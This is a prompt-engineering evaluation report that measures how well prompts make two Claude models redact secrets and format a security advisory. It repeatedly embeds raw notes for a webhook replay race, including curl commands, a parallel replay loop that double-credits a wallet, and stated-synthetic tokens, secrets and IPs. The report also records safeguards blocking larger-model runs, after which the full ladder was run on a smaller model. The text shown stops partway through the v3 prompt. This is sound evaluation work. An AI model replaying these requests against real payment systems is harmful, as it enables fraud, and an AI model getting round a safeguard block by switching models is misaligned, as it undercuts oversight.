# FL-02 · Prompting Fundamentals on Real Tasks v2

> FlyRank · Week 2 · General AI Fluency · Lenon D. Adriano · 2026-11-06
> Task under test: FL-01 **Target Task 2**, raw security reproduction notes → a verified, sanitized
> Markdown advisory. ([Prompt Ladder](./PROMPT_LADDER.md) used Target Task 1, so this uses T2.)

**Result in one line:** *few-shot examples* were the technique that mattered most. On the larger
model, v3 is the only run that met every FL-01 "Done Well" criterion. The *output structure* I wrote
for v4 introduced a new leak, which v5's step decomposition reduced but didn't eliminate.

---

## Section 1 · Selected FL-01 Target Task & Input Fixture

### Target Task 2, cited from [`FL-01_WORKFLOW_AUDIT.md` §2](./FL-01_WORKFLOW_AUDIT.md#t2--technical-vulnerability-advisory--poc-reproduction-report-formatter)

**T2 · Technical Vulnerability Advisory & PoC Reproduction Report Formatter.** Classification:
*Delegate to AI with Review.* Goal: *"turn my raw, already-verified terminal notes into a
publication-ready Markdown advisory using a fixed template prompt."*

| # | Criterion | Threshold | How it's measured |
| - | --------- | --------- | ----------------- |
| 1 | Required sections present: Executive Summary, Affected Versions, Root Cause, Reproduction Steps, CVSS Vector, Remediation Diff | **6 / 6** | Section checklist at review time |
| 2 | Time from raw terminal notes to publication-ready advisory | **< 10 minutes** | Timed from pasting the notes to final approval |
| 3 | Manual factual corrections needed during review | **< 3** | Counted and logged per advisory |
| 4 | Leaked sensitive tokens, credentials, or IPs | **0** | Redaction scan (secret/IP regex or `gitleaks`) on the output before publishing |

**Guardrails (from FL-01):** inputs are only PoC logs I verified myself in the sandbox (audit #1). AI never runs
exploits. The CVSS vector is checked against the official FIRST CVSS calculator by me, never taken
as-is from AI. Raw notes are redacted *before* they're pasted into any AI tool.

> ⚠️ **Why this fixture breaks the last guardrail on purpose.** FL-01 says raw notes are redacted
> *before* they reach any AI tool. To test whether each prompt makes the model redact, the fixture
> below is deliberately **unredacted**. That is safe only because **every sensitive value in it is
> synthetic**: the JWT's signature segment decodes to `SYNTHETIC-TEST-SIGNATURE-NOT-REAL`, and the IPs,
> hostname, HMAC secret, DB user and phone number were made up for this test. With real notes, redact
> first. The model's redaction is a second layer, never the first.

### Input fixture: the raw notes fed to all 6 versions

The notes describe a payout-webhook replay race: a non-atomic "already processed?" check lets two
concurrent copies of one signed delivery both credit a wallet. They contain **8 planted sensitive
values** (inventory in [`fixture/secrets.json`](./fl-02/fixture/secrets.json)) and two traps: an
untested guess about `refundStatus.ts`, and "CVE?? ask kim", where no CVE exists.

```text
## notes — payout-gateway webhook thing (staging) — 2026-11-03, jl
## env: payouts-stg.int.lending.local (10.42.0.19:8443), db 10.42.0.23
## version: payout-gateway@2.3.1 (package.json), commit 4be81c2

$ export TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtb3BzLWNvbnNvbGUiLCJlbnYiOiJzdGFnaW5nIiwicm9sZSI6InBheW91dF9hZG1pbiIsImlhdCI6MTc5MzkwMDAwMH0.U1lOVEhFVElDLVRFU1QtU0lHTkFUVVJFLU5PVC1SRUFM
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":0}

# grabbed a real signed delivery from provider sandbox dashboard -> "Download raw delivery"
# (any merchant user w/ 'viewer' role can download these, incl the X-Wallet-Signature header)
$ cat delivery_8812.json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"brw_4471","amount_centavos":500000}}
$ SIG=$(cat delivery_8812.sig)   # sha256=3c1f0b...

# sequential replay -> blocked, ok
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"ok"}
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"duplicate_ignored"}

# reset wallet (WALLET_WEBHOOK_SECRET=stg_whk_9f2c4e71b8d03a56e1f7c2b94d8a6e30 from the stg .env, needed to re-sign test payloads w/ new event ids)
# PARALLEL replay of the same delivery ->
$ for i in 1 2; do curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
{"status":"ok"}{"status":"ok"}
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":1000000}
# ^^^ credited TWICE. 5000 pesos reversal -> 10000 in wallet

$ psql -h 10.42.0.23 -U payouts_ro -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
  id   | borrower_id | amount_centavos |      ref
-------+-------------+-----------------+---------------
 90311 | brw_4471    |          500000 | evt_01JB7K2Q8M
 90312 | brw_4471    |          500000 | evt_01JB7K2Q8M
(2 rows)

# repro rate: 20/20 with 2 parallel curls, nothing special needed, just fire both at once
# with 5 parallel -> got 3 credits once, 2 credits other times

$ sed -n '52,64p' src/webhooks/payoutStatus.ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
61    }
62    await db.processedEvents.insert(evt.event_id)
63    return res.status(200).json({ status: 'ok' })
64  }

# so: exists() check, then credit (await ~180ms, calls wallet svc), THEN insert. two requests both pass exists() before either inserts.
# processed_events.event_id has no unique constraint either (checked \d processed_events)
# also no timestamp in the signed payload / no tolerance window, signature never expires
# refunds webhook (src/webhooks/refundStatus.ts) prob has same pattern?? didnt check
# CVE?? ask kim. severity: bad lol. prob high
```

**Reference answer, fixed before any run:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5
Medium**. `AC:L` because the notes report 20/20 reproductions, and `PR:L` because a `viewer` account
supplies the signed delivery. `AC:H` (5.3) is the defensible conservative choice. Several runs argued
it convincingly (see v1, v3 and v4), and they **found a gap in my reference**: the race needs an
`event_id` that hasn't been processed yet, and the notes only made that true by "resetting" the
state.

---

## Method (how to trust these results)

- **One technique per version.** Each version is the previous prompt plus exactly one block. A
  script checked, for each version, that removing the new block gives back the previous version
  byte for byte.
- **Real runs.** Each prompt ran once in a fresh Claude subagent, told to ignore any project context
  and allowed exactly one `Read` of its own prompt file. Two models ran the same prompts: a **larger
  Claude model** and a **smaller, faster Claude model**. ChatGPT was not tested: this session has no
  access to it, and I chose a Claude-vs-Claude comparison instead.
- **Measured by script, then reviewed by hand.**
  [`fl-02/harness/measure.py`](./fl-02/harness/measure.py) counts the 8 planted values in each
  advisory and scratchpad, invented `CVE-` IDs, the 6 FL-01 sections, and text outside `<advisory>`.
  Its CVSS v3.1 calculator recomputes every base score from the stated vector; it was checked against
  5 known vectors, including 9.8 and 7.8. Factual corrections were counted by hand against the notes,
  and every line citation was verified.
- **What went wrong, recorded rather than hidden:**
  - Anthropic's safeguards **stopped the larger model's v4** partway through (`[cyber]`) and **its v5
    before any output** (`[reasoning_extraction]`). So the smaller model ran the full ladder, and the
    larger model has v0–v3 plus a truncated v4.
  - **Context leak:** the smaller model's v0 cites "CLAUDE.md §3.2", which isn't in the notes. That
    agent saw this repository's `CLAUDE.md` despite the instruction to ignore it.
  - The smaller model's v3 made 3 tool calls instead of 1.
  - Each version ran once (n = 1), so some differences may be noise.

## Overview

| Version | Technique | Larger model | Smaller model |
| ------- | --------- | ------------ | ------------- |
| v0 | Naive one-line prompt | 0/8 leaks · 5/6 sections (no diff) · CVSS 6.5 · 0 corrections | 0/8 leaks · 4/6 (no CVSS, no diff) · 1 correction |
| v1 | Role Assignment | **3/8 leaks** · 5/6 (no diff) · CVSS 5.3 (`AC:H`) · 0 corrections | 0/8 · 4/6 (no CVSS, no diff) · 1 correction |
| v2 | Context and Motivation | 0/8 · 5/6 (no diff) · CVSS 7.5 (`PR:N`, no prefix) · 0 corrections | 0/8 · 4/6 (no CVSS, no diff) · 0 corrections |
| v3 | Few-Shot Examples | **0/8 · 6/6 · CVSS 5.3 · 1 correction · ✅ meets all 4 FL-01 criteria** | 0/8 · 4/6 (no CVSS, no "Root Cause" heading) · 1 correction |
| v4 | Output Structure | Truncated by safeguards (§1–§4 only) | **5/8 leaks** · 6/6 · CVSS 6.5 · 0 words outside tags · 1 correction |
| v5 | Step Decomposition | Blocked by safeguards | 3/8 leaks · 6/6 · CVSS 6.5 · 0 corrections · all line cites verified |

"Corrections" are factual errors I would have had to fix (FL-01 criterion 3, threshold < 3). Runs
took 22–155 seconds, so all pass criterion 2 (< 10 minutes) on model time.

---

## Section 2 · The 6 Prompt Iterations

### v0 · Naive one-line prompt

```text
Turn these terminal notes into a professional security vulnerability report: [RAW_NOTES]
```

<details>
<summary><strong>Full assembled prompt v0</strong> (the line above with the fixture pasted in, 391 words, exactly as sent: <a href="./fl-02/prompts/prompt-v0.txt"><code>prompt-v0.txt</code></a>)</summary>

```text
Turn these terminal notes into a professional security vulnerability report:

## notes — payout-gateway webhook thing (staging) — 2026-11-03, jl
## env: payouts-stg.int.lending.local (10.42.0.19:8443), db 10.42.0.23
## version: payout-gateway@2.3.1 (package.json), commit 4be81c2

$ export TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtb3BzLWNvbnNvbGUiLCJlbnYiOiJzdGFnaW5nIiwicm9sZSI6InBheW91dF9hZG1pbiIsImlhdCI6MTc5MzkwMDAwMH0.U1lOVEhFVElDLVRFU1QtU0lHTkFUVVJFLU5PVC1SRUFM
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":0}

# grabbed a real signed delivery from provider sandbox dashboard -> "Download raw delivery"
# (any merchant user w/ 'viewer' role can download these, incl the X-Wallet-Signature header)
$ cat delivery_8812.json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"brw_4471","amount_centavos":500000}}
$ SIG=$(cat delivery_8812.sig)   # sha256=3c1f0b...

# sequential replay -> blocked, ok
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"ok"}
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"duplicate_ignored"}

# reset wallet (WALLET_WEBHOOK_SECRET=stg_whk_9f2c4e71b8d03a56e1f7c2b94d8a6e30 from the stg .env, needed to re-sign test payloads w/ new event ids)
# PARALLEL replay of the same delivery ->
$ for i in 1 2; do curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
{"status":"ok"}{"status":"ok"}
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":1000000}
# ^^^ credited TWICE. 5000 pesos reversal -> 10000 in wallet

$ psql -h 10.42.0.23 -U payouts_ro -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
  id   | borrower_id | amount_centavos |      ref
-------+-------------+-----------------+---------------
 90311 | brw_4471    |          500000 | evt_01JB7K2Q8M
 90312 | brw_4471    |          500000 | evt_01JB7K2Q8M
(2 rows)

# repro rate: 20/20 with 2 parallel curls, nothing special needed, just fire both at once
# with 5 parallel -> got 3 credits once, 2 credits other times

$ sed -n '52,64p' src/webhooks/payoutStatus.ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
61    }
62    await db.processedEvents.insert(evt.event_id)
63    return res.status(200).json({ status: 'ok' })
64  }

# so: exists() check, then credit (await ~180ms, calls wallet svc), THEN insert. two requests both pass exists() before either inserts.
# processed_events.event_id has no unique constraint either (checked \d processed_events)
# also no timestamp in the signed payload / no tolerance window, signature never expires
# refunds webhook (src/webhooks/refundStatus.ts) prob has same pattern?? didnt check
# CVE?? ask kim. severity: bad lol. prob high
```

</details>

**Observed output.** Larger model ([full](./fl-02/runs/run-larger-v0-naive.md)):

> **Before you share this:** your raw notes contain live-looking secrets and personal data: a bearer
> JWT, the staging `WALLET_WEBHOOK_SECRET`, internal IPs and hostnames, a borrower phone number
> (MSISDN), and a partial HMAC signature. I have redacted all of them below.
>
> | **Proposed severity** | **High** (business impact). CVSS v3.1 base score 6.5 (see Severity) |

Smaller model ([full](./fl-02/runs/run-smaller-v0-naive.md)):

> **High** (author's estimate: "prob high"; this report agrees). […] No CVSS score has been calculated.
> […] The ledger rules in CLAUDE.md §3.2 (immutable, reversal by compensating entry only) still apply.

**What the output shows.** Without any technique, both models already **redacted all 8 planted values**
and invented no CVE. What v0 lacks is *form*:
- **Neither produced a unified diff.** The larger model rewrote the whole function in a ` ```ts `
  block; the smaller one gave prose steps.
- **The smaller model never scored severity.** It agreed with the researcher's "prob high", which is
  exactly the vague severity a reviewer would bounce.
- **The smaller model's one correction** is the `CLAUDE.md §3.2` reference, which leaked in from this
  repository.

> **Brief vs. reality:** the brief predicted v0 would echo the bearer token and `10.42.0.19`, invent a
> CVE, and say "very dangerous bug". Measured: **0 leaks and 0 invented CVEs in both models.** The
> vague-severity prediction held only for the smaller model; the missing diff held for both.

### v1 · Technique 1: Role Assignment

**Exact diff added** (prepended before the task line):

```diff
+ You are a Principal Application Security Researcher and Technical Advisory Editor. You write security advisories to the standard used by OWASP and GitHub Security Advisory (GHSA) maintainers.
```

<details>
<summary><strong>Full assembled prompt v1</strong> (v0 + Role, 418 words, exactly as sent: <a href="./fl-02/prompts/prompt-v1.txt"><code>prompt-v1.txt</code></a>)</summary>

```text
You are a Principal Application Security Researcher and Technical Advisory Editor. You write security advisories to the standard used by OWASP and GitHub Security Advisory (GHSA) maintainers.

Turn these terminal notes into a professional security vulnerability report:

## notes — payout-gateway webhook thing (staging) — 2026-11-03, jl
## env: payouts-stg.int.lending.local (10.42.0.19:8443), db 10.42.0.23
## version: payout-gateway@2.3.1 (package.json), commit 4be81c2

$ export TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtb3BzLWNvbnNvbGUiLCJlbnYiOiJzdGFnaW5nIiwicm9sZSI6InBheW91dF9hZG1pbiIsImlhdCI6MTc5MzkwMDAwMH0.U1lOVEhFVElDLVRFU1QtU0lHTkFUVVJFLU5PVC1SRUFM
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":0}

# grabbed a real signed delivery from provider sandbox dashboard -> "Download raw delivery"
# (any merchant user w/ 'viewer' role can download these, incl the X-Wallet-Signature header)
$ cat delivery_8812.json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"brw_4471","amount_centavos":500000}}
$ SIG=$(cat delivery_8812.sig)   # sha256=3c1f0b...

# sequential replay -> blocked, ok
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"ok"}
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"duplicate_ignored"}

# reset wallet (WALLET_WEBHOOK_SECRET=stg_whk_9f2c4e71b8d03a56e1f7c2b94d8a6e30 from the stg .env, needed to re-sign test payloads w/ new event ids)
# PARALLEL replay of the same delivery ->
$ for i in 1 2; do curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
{"status":"ok"}{"status":"ok"}
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":1000000}
# ^^^ credited TWICE. 5000 pesos reversal -> 10000 in wallet

$ psql -h 10.42.0.23 -U payouts_ro -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
  id   | borrower_id | amount_centavos |      ref
-------+-------------+-----------------+---------------
 90311 | brw_4471    |          500000 | evt_01JB7K2Q8M
 90312 | brw_4471    |          500000 | evt_01JB7K2Q8M
(2 rows)

# repro rate: 20/20 with 2 parallel curls, nothing special needed, just fire both at once
# with 5 parallel -> got 3 credits once, 2 credits other times

$ sed -n '52,64p' src/webhooks/payoutStatus.ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
61    }
62    await db.processedEvents.insert(evt.event_id)
63    return res.status(200).json({ status: 'ok' })
64  }

# so: exists() check, then credit (await ~180ms, calls wallet svc), THEN insert. two requests both pass exists() before either inserts.
# processed_events.event_id has no unique constraint either (checked \d processed_events)
# also no timestamp in the signed payload / no tolerance window, signature never expires
# refunds webhook (src/webhooks/refundStatus.ts) prob has same pattern?? didnt check
# CVE?? ask kim. severity: bad lol. prob high
```

</details>

**Observed output.** Larger model ([full](./fl-02/runs/run-larger-v1-role.md)):

> | Internal hostname, `10.42.0.19`, `10.42.0.23` | Infrastructure details | Keep these in the internal ticket only |
>
> | CVSS v3.1 (conservative) | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N`, **5.3 (Medium)** |
> | CVSS v3.1 (if the precondition is easy to meet) | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`, **6.5 (Medium)** |

Smaller model: *"# Security Advisory: Double Credit of Wallet Reversals via Race…"* · *"Severity: High
(provisional; not yet scored)"* ([full](./fl-02/runs/run-smaller-v1-role.md)).

**What changed in the output, and why.** The role changed **how the models judge**, not only how they
sound:
- **Larger model: a defended range, not one number.** It moved to a conservative `AC:H` score with a
  written precondition ("needs an `event_id` that is not yet processed"). It added `CWE-362` next to
  `CWE-367`, and an "Open Items (not verified)" list.
- **Smaller model: it now says "advisory"**, but still doesn't score.

**The role also caused the first leak.** Trying to be helpful, the larger model put a *"Removed from
notes"* table at the top and printed the two raw IPs **in the table explaining their removal**. It
also kept `-U payouts_ro` in a `psql` line. That's 3 of 8 values leaked. The role made the model more
thorough, and nothing told it the reader was external.

> **Brief vs. reality:** the brief predicted clinical tone and CWE IDs (✅ observed) and leaking "the raw
> JWT and internal IP" (partly: the IPs and DB user leaked; the JWT never did).

### v2 · Technique 2: Context and Motivation

**Exact diff added** (inserted after the role, before the task line):

```diff
+ Context: this advisory will be published to external client engineering leads and to the maintainers of a public repository. The notes come from an internal staging environment, so any token, secret, internal IP address, internal hostname, database user or personal data copied into the advisory would be a disclosure incident. Readers will act on what you write, so state only what the notes show: an exaggerated or unverified impact claim costs the researcher their credibility, and an invented identifier (such as a CVE number that has not been assigned) misleads the people patching.
```

<details>
<summary><strong>Full assembled prompt v2</strong> (v1 + Context, 511 words, exactly as sent: <a href="./fl-02/prompts/prompt-v2.txt"><code>prompt-v2.txt</code></a>)</summary>

```text
You are a Principal Application Security Researcher and Technical Advisory Editor. You write security advisories to the standard used by OWASP and GitHub Security Advisory (GHSA) maintainers.

Context: this advisory will be published to external client engineering leads and to the maintainers of a public repository. The notes come from an internal staging environment, so any token, secret, internal IP address, internal hostname, database user or personal data copied into the advisory would be a disclosure incident. Readers will act on what you write, so state only what the notes show: an exaggerated or unverified impact claim costs the researcher their credibility, and an invented identifier (such as a CVE number that has not been assigned) misleads the people patching.

Turn these terminal notes into a professional security vulnerability report:

## notes — payout-gateway webhook thing (staging) — 2026-11-03, jl
## env: payouts-stg.int.lending.local (10.42.0.19:8443), db 10.42.0.23
## version: payout-gateway@2.3.1 (package.json), commit 4be81c2

$ export TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtb3BzLWNvbnNvbGUiLCJlbnYiOiJzdGFnaW5nIiwicm9sZSI6InBheW91dF9hZG1pbiIsImlhdCI6MTc5MzkwMDAwMH0.U1lOVEhFVElDLVRFU1QtU0lHTkFUVVJFLU5PVC1SRUFM
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":0}

# grabbed a real signed delivery from provider sandbox dashboard -> "Download raw delivery"
# (any merchant user w/ 'viewer' role can download these, incl the X-Wallet-Signature header)
$ cat delivery_8812.json
{"event_id":"evt_01JB7K2Q8M","type":"payout.reversed","data":{"borrower_id":"brw_4471","amount_centavos":500000}}
$ SIG=$(cat delivery_8812.sig)   # sha256=3c1f0b...

# sequential replay -> blocked, ok
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"ok"}
$ curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json
{"status":"duplicate_ignored"}

# reset wallet (WALLET_WEBHOOK_SECRET=stg_whk_9f2c4e71b8d03a56e1f7c2b94d8a6e30 from the stg .env, needed to re-sign test payloads w/ new event ids)
# PARALLEL replay of the same delivery ->
$ for i in 1 2; do curl -sk -X POST https://10.42.0.19:8443/webhooks/wallet/payout-status -H "X-Wallet-Signature: $SIG" -H "Content-Type: application/json" --data-binary @delivery_8812.json & done; wait
{"status":"ok"}{"status":"ok"}
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
{"borrower_id":"brw_4471","msisdn":"09175550142","balance_centavos":1000000}
# ^^^ credited TWICE. 5000 pesos reversal -> 10000 in wallet

$ psql -h 10.42.0.23 -U payouts_ro -c "select id, borrower_id, amount_centavos, ref from wallet_ledger where ref='evt_01JB7K2Q8M';"
  id   | borrower_id | amount_centavos |      ref
-------+-------------+-----------------+---------------
 90311 | brw_4471    |          500000 | evt_01JB7K2Q8M
 90312 | brw_4471    |          500000 | evt_01JB7K2Q8M
(2 rows)

# repro rate: 20/20 with 2 parallel curls, nothing special needed, just fire both at once
# with 5 parallel -> got 3 credits once, 2 credits other times

$ sed -n '52,64p' src/webhooks/payoutStatus.ts
52  export async function handlePayoutStatus(req: Request, res: Response) {
53    const sig = req.header('X-Wallet-Signature')
54    if (!verifyHmac(req.rawBody, sig, process.env.WALLET_WEBHOOK_SECRET)) return res.status(401).end()
55    const evt = JSON.parse(req.rawBody.toString())
56    if (await db.processedEvents.exists(evt.event_id)) {
57      return res.status(200).json({ status: 'duplicate_ignored' })
58    }
59    if (evt.type === 'payout.reversed') {
60      await wallet.credit(evt.data.borrower_id, evt.data.amount_centavos, { ref: evt.event_id })
61    }
62    await db.processedEvents.insert(evt.event_id)
63    return res.status(200).json({ status: 'ok' })
64  }

# so: exists() check, then credit (await ~180ms, calls wallet svc), THEN insert. two requests both pass exists() before either inserts.
# processed_events.event_id has no unique constraint either (checked \d processed_events)
# also no timestamp in the signed payload / no tolerance window, signature never expires
# refunds webhook (src/webhooks/refundStatus.ts) prob has same pattern?? didnt check
# CVE?? ask kim. severity: bad lol. prob high
```

</details>

**Observed output.** Larger model ([full](./fl-02/runs/run-larger-v2-context.md)):

> ## Internal Pre-Publication Checklist (remove this section before publishing)
>
> | Bearer token for an internal `payout_admin` service account | Revoke or rotate it. It appeared in plaintext in the notes. |
> | Internal hostname, gateway IP/port and database IP | Replaced with `<GATEWAY_HOST>` or omitted. |

Smaller model: *"## Disclosure handling — The staging notes contained a bearer token, a webhook signing
secret, internal IP addresses and hostnames, a database account name, and a personal phone number. All
of these are omitted here."* ([full](./fl-02/runs/run-smaller-v2-context.md))

**What changed in the output, and why.** Telling the model that *external readers will act on this*
changed two behaviors:
- **Leaks went from 3/8 to 0/8 on the larger model.** It still lists what it removed, but now by
  **type** ("gateway IP/port"), not by value.
- **Hedging went up.** The larger model's count of "not verified / not tested" caveats rose from 4 to
  7, the most of any run, because it now knows unverified claims cost credibility.

**Still failing:**
- **The larger model's headline score moved to `PR:N` (7.5),** and its vector lost the `CVSS:3.1/`
  prefix. That's a format drift.
- **Still no unified diff from either model.**
- The smaller model produced its shortest advisory (677 words), with no CVSS.

> **Brief vs. reality:** the brief predicted that redaction would begin, with an inconsistent format.
> In fact redaction was already complete in v0. What context fixed was the *leak the role had
> introduced*. The CVSS drift prediction held (prefix lost, `PR:N`).

### v3 · Technique 3: Few-Shot Examples

**Exact diff added** (inserted after the context, before the task line):

````diff
+ Here are two examples of the transformations to apply.
+
+ <example>
+ <input>
+ $ curl -sk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWZ1bmQtYm90In0.ZmFrZS1zaWc" https://10.8.3.7:9443/internal/refunds?limit=5
+ </input>
+ <output>
+ ```bash
+ curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:9443/internal/refunds?limit=5"
+ ```
+ Tokens and secrets become `<REDACTED_JWT>` / `<REDACTED_SECRET>`, internal IPs become RFC 5737 documentation addresses (`192.0.2.x`), internal hostnames become `api.example.test`, and every original curl flag is kept.
+ </output>
+ </example>
+
+ <example>
+ <input>
+ # think the refund handler trusts the amount from the client?? line 41ish
+ 41    const amount = req.body.amount
+ 42    await refunds.issue(order.id, amount)
+ </input>
+ <output>
+ Root cause: `src/refunds/handler.ts:41` reads `amount` from the untrusted request body and passes it to `refunds.issue()` (line 42) without comparing it to the stored order total (CWE-602).
+
+ ```diff
+ -    const amount = req.body.amount
+ -    await refunds.issue(order.id, amount)
+ +    const amount = order.totalCentavos
+ +    await refunds.issue(order.id, amount)
+ ```
+ </output>
+ </example>
````

<details>
<summary><strong>Full assembled prompt v3</strong> (v2 + Few-Shot, 643 words, exactly as sent: <a href="./fl-02/prompts/prompt-v3.txt"><code>prompt-v3.txt</code></a>)</summary>

````text
You are a Principal Application Security Researcher and Technical Advisory Editor. You write security advisories to the standard used by OWASP and GitHub Security Advisory (GHSA) maintainers.

Context: this advisory will be published to external client engineering leads and to the maintainers of a public repository. The notes come from an internal staging environment, so any token, secret, internal IP address, internal hostname, database user or personal data copied into the advisory would be a disclosure incident. Readers will act on what you write, so state only what the notes show: an exaggerated or unverified impact claim costs the researcher their credibility, and an invented identifier (such as a CVE number that has not been assigned) misleads the people patching.

Here are two examples of the transformations to apply.

<example>
<input>
$ curl -sk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWZ1bmQtYm90In0.ZmFrZS1zaWc" https://10.8.3.7:9443/internal/refunds?limit=5
</input>
<output>
```bash
curl -sk -H "Authorization: Bearer <REDACTED_JWT>" "https://192.0.2.10:9443/internal/refunds?limit=5"
```
Tokens and secrets become `<REDACTED_JWT>` / `<REDACTED_SECRET>`, internal IPs become RFC 5737 documentation addresses (`192.0.2.x`), internal hostnames become `api.example.test`, and every original curl flag is kept.
</output>
</example>

<example>
<input>
# think the refund handler trusts the amount from the client?? line 41ish
41    const amount = req.body.amount
42    await refunds.issue(order.id, amount)
</input>
<output>
Root cause: `src/refunds/handler.ts:41` reads `amount` from the untrusted request body and passes it to `refunds.issue()` (line 42) without comparing it to the stored order total (CWE-602).

```diff
-    const amount = req.body.amount
-    await refunds.issue(order.id, amount)
+    const amount = order.totalCentavos
+    await refunds.issue(order.id, amount)
```
</output>
</example>

Turn these terminal notes into a professional security vulnerability report:

## notes — payout-gateway webhook thing (staging) — 2026-11-03, jl
## env: payouts-stg.int.lending.local (10.42.0.19:8443), db 10.42.0.23
## version: payout-gateway@2.3.1 (package.json), commit 4be81c2

$ export TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdmMtb3BzLWNvbnNvbGUiLCJlbnYiOiJzdGFnaW5nIiwicm9sZSI6InBheW91dF9hZG1pbiIsImlhdCI6MTc5MzkwMDAwMH0.U1lOVEhFVElDLVRFU1QtU0lHTkFUVVJFLU5PVC1SRUFM
$ curl -sk -H "Authorization: Bearer $TOKEN" https://10.42.0.19:8443/admin/wallets/brw_4471
